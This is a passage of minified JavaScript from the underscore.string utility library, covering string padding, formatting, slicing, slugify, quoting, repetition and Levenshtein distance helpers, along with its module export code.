					return s = n - e.length, o(r, s) + e
				}
			},
			lpad: function(e, t, n) {
				return p.pad(e, t, n)
			},
			rpad: function(e, t, n) {
				return p.pad(e, t, n, "right")
			},
			lrpad: function(e, t, n) {
				return p.pad(e, t, n, "both")
			},
			sprintf: h,
			vsprintf: function(e, t) {
				return t.unshift(e), h.apply(null, t)
			},
			toNumber: function(e, n) {
				if (e == null || e == "") return 0;
				e = t(e);
				var r = s(s(e).toFixed(~~n));
				return r === 0 && !e.match(/^0+$/) ? Number.NaN : r
			},
			numberFormat: function(e, t, n, r) {
				if (isNaN(e) || e == null) return "";
				e = e.toFixed(~~t), r = r || ",";
				var i = e.split("."),
					s = i[0],
					o = i[1] ? (n || ".") + i[1] : "";
				return s.replace(/(\d)(?=(?:\d{3})+$)/g, "$1" + r) + o
			},
			strRight: function(e, n) {
				if (e == null) return "";
				e = t(e), n = n != null ? t(n) : n;
				var r = n ? e.indexOf(n) : -1;
				return ~r ? e.slice(r + n.length, e.length) : e
			},
			strRightBack: function(e, n) {
				if (e == null) return "";
				e = t(e), n = n != null ? t(n) : n;
				var r = n ? e.lastIndexOf(n) : -1;
				return ~r ? e.slice(r + n.length, e.length) : e
			},
			strLeft: function(e, n) {
				if (e == null) return "";
				e = t(e), n = n != null ? t(n) : n;
				var r = n ? e.indexOf(n) : -1;
				return ~r ? e.slice(0, r) : e
			},
			strLeftBack: function(e, t) {
				if (e == null) return "";
				e += "", t = t != null ? "" + t : t;
				var n = e.lastIndexOf(t);
				return ~n ? e.slice(0, n) : e
			},
			toSentence: function(e, t, n, r) {
				t = t || ", ", n = n || " and ";
				var i = e.slice(),
					s = i.pop();
				return e.length > 2 && r && (n = p.rtrim(t) + n), i.length ? i.join(t) + n + s : s
			},
			toSentenceSerial: function() {
				var e = u.call(arguments);
				return e[3] = !0, p.toSentence.apply(p, e)
			},
			slugify: function(e) {
				if (e == null) return "";
				var n = "ąàáäâãåæćęèéëêìíïîłńòóöôõøùúüûñçżź",
					r = "aaaaaaaaceeeeeiiiilnoooooouuuunczz",
					i = new RegExp(a(n), "g");
				return e = t(e).toLowerCase().replace(i, function(e) {
					var t = n.indexOf(e);
					return r.charAt(t) || "-"
				}), p.dasherize(e.replace(/[^\w\s-]/g, ""))
			},
			surround: function(e, t) {
				return [t, e, t].join("")
			},
			quote: function(e) {
				return p.surround(e, '"')
			},
			exports: function() {
				var e = {};
				for (var t in this) {
					if (!this.hasOwnProperty(t) || t.match(/^(?:include|contains|reverse)$/)) continue;
					e[t] = this[t]
				}
				return e
			},
			repeat: function(e, n, r) {
				if (e == null) return "";
				n = ~~n;
				if (r == null) return o(t(e), n);
				for (var i = []; n > 0; i[--n] = e);
				return i.join(r)
			},
			levenshtein: function(e, n) {
				if (e == null && n == null) return 0;
				if (e == null) return t(n).length;
				if (n == null) return t(e).length;
				e = t(e), n = t(n);
				var r = [],
					i, s;
				for (var o = 0; o <= n.length; o++) for (var u = 0; u <= e.length; u++) o && u ? e.charAt(u - 1) === n.charAt(o - 1) ? s = i : s = Math.min(r[u], r[u - 1], i) + 1 : s = o + u, i = r[u], r[u] = s;
				return r.pop()
			}
		};
	p.strip = p.trim, p.lstrip = p.ltrim, p.rstrip = p.rtrim, p.center = p.lrpad, p.rjust = p.lpad, p.ljust = p.rpad, p.contains = p.include, p.q = p.quote, typeof exports != "undefined" ? (typeof module != "undefined" && module.exports && (module.exports = p), exports._s = p) : typeof define == "function" && define.amd ? define("underscore.string", [], function() {
		return p
	}) : (e._ = e._ || {}, e._.string = e._.str = p)
}(this, String);
_.mixin(_.str.exports());
